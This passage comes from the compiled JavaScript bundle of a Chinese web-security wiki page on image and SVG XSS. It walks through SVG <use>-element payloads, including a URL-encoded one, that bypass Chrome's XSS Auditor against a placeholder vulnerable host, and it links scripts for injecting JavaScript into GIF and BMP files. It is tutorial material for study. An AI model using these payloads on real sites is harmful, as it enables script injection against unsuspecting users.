fly</p><p>我们想加载另外的 SVG 文件，因此我们以 <code>&lt;svg&gt;&lt;use xlink:href=</code>​ 开始。但是等一下，它必须满足同源，我们不能使用 data 伪协议，该怎么获取服务器上的文件呢？很简单，我们在一行中两次利用 XSS 漏洞！首先，我们构建一个 URL，制作一个包含了 Javascript URL 为伪协议的 SVG。【套娃】</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code>http<span class="token punctuation">:</span><span class="token comment">//vulnerabledomain.com/xss.php?x=&lt;svg id=&quot;rectangle&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;width=&quot;100&quot; height=&quot;100&quot;&gt;&lt;a xlink:href=&quot;javascript:alert(location)&quot;&gt;&lt;rect class=&quot;blue&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; /&gt;&lt;/a&gt;&lt;/svg&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果你将整个 URL 粘贴到没有 XSS Filter 的浏览器，马上就会出现一个黑色的矩形。但是前面已经提到过，Chrome 的 XSS Auditor 会捕获这种攻击，还是继续吧：<br> 现在我们要在 <code>&lt;use&gt;</code>​ 元素中使用创建的 SVG 文件，制造一个形如这样的 URL：</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code>http<span class="token punctuation">:</span><span class="token comment">//vulnerabledomain.com/xss.php?x=&lt;svg&gt;&lt;use height=200 width=200</span>\nxlink<span class="token punctuation">:</span>href<span class="token operator">=</span><span class="token string single-quoted-string">&#39;http://vulnerabledomain.com/xss.php?x=&lt;svg id=&quot;rectangle&quot;xmlns=&quot;http://www.w3.org/2000/svg&quot;xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;width=&quot;100&quot; height=&quot;100&quot;&gt;&lt;a xlink:href=&quot;javascript:alert(location)&quot;&gt;&lt;rect class=&quot;blue&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;#rectangle&#39;</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>svg<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>进行 url 编码，这下应该会显示出矩形了，点击就会执行 alert，但是这一次没有触发 XSS Auditor 😃</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code>http<span class="token punctuation">:</span><span class="token comment">//vulnerabledomain.com/xss.php?x=%3Csvg%3E%3Cuse%20height=200%20width=200%20xlink:href=%27http://vulnerabledomain.com/xss.php?x=%3Csvg%20id%3D%22rectangle%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20%20%20%20width%3D%22100%22%20height%3D%22100%22%3E%3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%28location%29%22%3E%3Crect%20class%3D%22blue%22%20x%3D%220%22%20y%3D%220%22%20width%3D%22100%22%20height%3D%22100%22%20%2F%3E%3C%2Fa%3E%3C%2Fsvg%3E%23rectangle%27/%3E%3C/svg%3E</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h1>',46),w={href:"https://www.cnblogs.com/r00tgrok/p/SVG_Build_XSS_Vector_Bypass_Firefox_And_Chrome.html",target:"_blank",rel:"noopener noreferrer"},S={},I=(0,a(7708).A)(S,[["render",function(n,s){const a=(0,t.g2)("ExternalLinkIcon");return(0,t.uX)(),(0,t.CE)("div",null,[i,(0,t.Lk)("p",null,[(0,t.eW)("向 gif 文件中注入 JavaScript 的 python2 脚本："),(0,t.Lk)("a",r,[(0,t.eW)("http://pastebin.com/6yUbfGX5"),(0,t.bF)(a)])]),u,(0,t.Lk)("p",null,[(0,t.eW)("向 bmp 文件中注入 JavaScript 的 python2 脚本："),(0,t.Lk)("a",d,[(0,t.eW)("http://pastebin.com/04y7ee3u"),(0,t.bF)(a)])]),k,(0,t.Lk)("p",null,[(0,t.eW)("​"),m,(0,t.eW)("​​ 文件以 "),v,(0,t.eW)("​​ 标签开始，其 id 设置为 rectangle，使用 rect 标签绘一个矩形。可以使用 "),g,(0,t.eW)("​​ 标签包围 "),b,(0,t.eW)("​​ 标签，从而创建一个"),(0,t.Lk)("a",h,[(0,t.eW)("超链接"),(0,t.bF)(a)]),(0,t.eW)("。使用 "),(0,t.Lk)("a",q,[(0,t.eW)("Javascript 伪协议"),(0,t.bF)(a)]),(0,t.eW)("，可点击的超链接在点击后会执行 Javascript。即使通过 "),x,(0,t.eW)("​​ 标记加载 SVG，也会执行 JavaScript。需要注意的是，只能加载位于同一源的 SVG 文件。")]),f,(0,t.Lk)("ul",null,[(0,t.Lk)("li",null,[(0,t.Lk)("a",w,[(0,t.eW)("用 SVG 绕过浏览器 XSS 审计 - r00tgrok - 博客园 (cnblogs.com)"),(0,t.bF)(a)])])])])}]]),y=JSON.parse('{"path":"/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%20XSS.html","title":"图片 XSS","lang":"zh-CN","frontmatter":{"title":"图片 XSS","description":"图片 XSS 图片 XSS，简单地说，就是将 JavaScript 代码尽量插入图片的无用区域，在不影响图片显示的情况下满足 JS 代码格式从而执行图片中的 JS 代码导致 XSS。 注意：只对 IE 有效，Chrome 和 Firefox 无法触发（因为有版本限制）。 注入脚本 Gif 向 gif 文件中注入 JavaScript 的 python2...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%20XSS.html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"图片 XSS"}],["meta",{"property":"og:description","content":"图片 XSS 图片 XSS，简单地说，就是将 JavaScript 代码尽量插入图片的无用区域，在不影响图片显示的情况下满足 JS 代码格式从而执行图片中的 JS 代码导致 XSS。 注意：只对 IE 有效，Chrome 和 Firefox 无法触发（因为有版本限制）。 注入脚本 Gif 向 gif 文件中注入 JavaScript 的 python2..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"图片 XSS\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"注入脚本","slug":"注入脚本","link":"#注入脚本","children":[{"level":3,"title":"Gif","slug":"gif","link":"#gif","children":[]},{"level":3,"title":"Bmp","slug":"bmp","link":"#bmp","children":[]}]},{"level":2,"title":"使用","slug":"使用","link":"#使用","children":[]},{"level":2,"title":"​<use>​ 元素","slug":"​-use-​-元素","link":"#​-use-​-元素","children":[]},{"level":2,"title":"​data:url+Base64​","slug":"​data-url-base64​","link":"#​data-url-base64​","children":[]},{"level":2,"title":"无需点击触发 xss","slug":"无需点击触发-xss","link":"#无需点击触发-xss","children":[]},{"level":2,"title":"Link XSS Bypass Chrome","slug":"link-xss-bypass-chrome","link":"#link-xss-bypass-chrome","children":[]},{"level":2,"title":"结合语言参数","slug":"结合语言参数","link":"#结合语言参数","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":10.19,"words":3056},"filePathRelative":"websec/安全漏洞/图片 XSS.md","autoDesc":true}')}}]);